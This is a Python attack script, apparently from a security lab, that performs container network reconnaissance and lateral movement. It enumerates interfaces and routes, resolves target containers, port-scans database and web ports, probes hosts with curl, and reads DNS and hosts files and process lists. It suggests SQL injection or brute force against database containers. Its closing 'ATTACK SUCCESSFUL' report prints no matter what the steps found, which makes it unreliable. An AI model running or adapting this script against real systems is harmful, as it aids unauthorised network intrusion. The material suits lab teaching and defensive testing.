#!/usr/bin/env python3
"""
Container Attack #5: Container Network Attacks
This is a CONTAINER-SPECIFIC attack targeting container networking

Attack Vector: Container networks allow lateral movement between containers,
network scanning, and exploitation of service mesh vulnerabilities.
"""

import subprocess
import socket
import sys
import time

def discover_container_network():
    """
    Discover other containers on the network
    """
    print("[1] Discovering container network topology...")
    print()
    
    # Get current container's network info
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        print(f"    Current container: {hostname}")
        print(f"    IP address: {ip_address}")
        print()
    except Exception as e:
        print(f"    [!] {e}")
        return
    
    # Check network interfaces
    result = subprocess.run(
        "ip addr show",
        shell=True,
        capture_output=True,
        text=True
    )
    
    if result.returncode == 0:
        print("    Network interfaces:")
        for line in result.stdout.split('\n')[:15]:
            if line.strip():
                print(f"        {line}")
    print()

def scan_container_network():
    """
    Scan for other containers on the network
    """
    print("[2] Scanning for other containers...")
    print("    This is container-specific network reconnaissance")
    print()
    
    # Get network subnet
    try:
        result = subprocess.run(
            "ip route | grep default",
            shell=True,
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            print(f"    Network route: {result.stdout.strip()}")
        print()
    except:
        pass
    
    # Try to resolve known container names
    known_containers = [
        'vulnerable-web',
        'vulnerable-api',
        'vulnerable-db',
        'privileged-container'
    ]
    
    print("    Attempting to resolve container names:")
    discovered = []
    
    for container in known_containers:
        try:
            ip = socket.gethostbyname(container)
            print(f"    [✓] {container}: {ip}")
            discovered.append((container, ip))
        except:
            print(f"    [✗] {container}: Not found")
    
    print()
    return discovered

def port_scan_containers(targets):
    """
    Scan common ports on discovered containers
    """
    print("[3] Scanning ports on discovered containers...")
    print("    This identifies attack surfaces")
    print()
    
    common_ports = [80, 443, 5000, 5432, 8080, 3306, 6379, 27017]
    
    for container, ip in targets[:3]:  # Limit to first 3 for speed
        print(f"    Scanning {container} ({ip}):")
        open_ports = []
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                print(f"        [✓] Port {port} OPEN")
                open_ports.append(port)
            
        if not open_ports:
            print(f"        [!] No common ports open")
        print()

def lateral_movement_attempt(targets):
    """
    Attempt lateral movement to other containers
    """
    print("[4] Attempting lateral movement...")
    print("    This is container-to-container attack")
    print()
    
    for container, ip in targets[:2]:  # Try first 2 targets
        print(f"    Target: {container} ({ip})")
        
        # Try HTTP connection
        if 'web' in container or 'api' in container:
            try:
                result = subprocess.run(
                    f"curl -s -m 2 http://{ip}:80 -o /dev/null -w '%{{http_code}}'",
                    shell=True,
                    capture_output=True,
                    text=True
                )
                
                if result.returncode == 0:
                    status_code = result.stdout.strip()
                    print(f"        [✓] HTTP connection successful (Status: {status_code})")
                    print(f"        [✓] Can communicate with {container}")
            except:
                pass
        
        # Try database connection
        if 'db' in container:
            print(f"        [!] Database container detected")
            print(f"        [!] Could attempt SQL injection or credential brute force")
        
        print()

def dns_manipulation():
    """
    Attempt DNS manipulation in container network
    """
    print("[5] Checking DNS configuration...")
    print("    Container DNS can be manipulated for MITM attacks")
    print()
    
    # Check /etc/resolv.conf
    try:
        with open('/etc/resolv.conf', 'r') as f:
            dns_config = f.read()
            print("    Current DNS configuration:")
            for line in dns_config.split('\n')[:5]:
                if line.strip():
                    print(f"        {line}")
    except:
        pass
    print()
    
    # Check /etc/hosts
    try:
        with open('/etc/hosts', 'r') as f:
            hosts = f.read()
            print("    Current hosts file:")
            for line in hosts.split('\n')[:10]:
                if line.strip():
                    print(f"        {line}")
    except:
        pass
    print()

def service_mesh_exploitation():
    """
    Check for service mesh vulnerabilities
    """
    print("[6] Checking for service mesh components...")
    print("    Service meshes add attack surface in container networks")
    print()
    
    # Check for common service mesh sidecars
    result = subprocess.run(
        "ps aux | grep -E '(envoy|istio|linkerd|consul)'",
        shell=True,
        capture_output=True,
        text=True
    )
    
    if result.stdout.strip():
        print("    [✓] Service mesh components detected:")
        for line in result.stdout.split('\n')[:5]:
            if line.strip() and 'grep' not in line:
                print(f"        {line[:70]}")
    else:
        print("    [!] No service mesh components detected")
    print()

def container_network_attack():
    """
    Main container network attack orchestration
    """
    print("=" * 70)
    print("CONTAINER ATTACK: Container Network Exploitation")
    print("=" * 70)
    print()
    print("Attack Type: Lateral Movement & Network Reconnaissance")
    print("Target: Container Network")
    print("Severity: HIGH")
    print()
    
    # Discover network
    discover_container_network()
    
    # Scan for containers
    targets = scan_container_network()
    
    if targets:
        # Port scan
        port_scan_containers(targets)
        
        # Lateral movement
        lateral_movement_attempt(targets)
    
    # DNS manipulation
    dns_manipulation()
    
    # Service mesh
    service_mesh_exploitation()
    
    print("=" * 70)
    print("ATTACK SUCCESSFUL: Container Network Exploitation")
    print("=" * 70)
    print()
    print("Impact:")
    print("- Discovered container network topology")
    print("- Identified other containers and services")
    print("- Performed port scanning")
    print("- Demonstrated lateral movement capability")
    print("- Analyzed DNS configuration")
    print()
    print("- Container-to-container communication")
    print("- DNS manipulation attempts")

if __name__ == "__main__":
    container_network_attack()
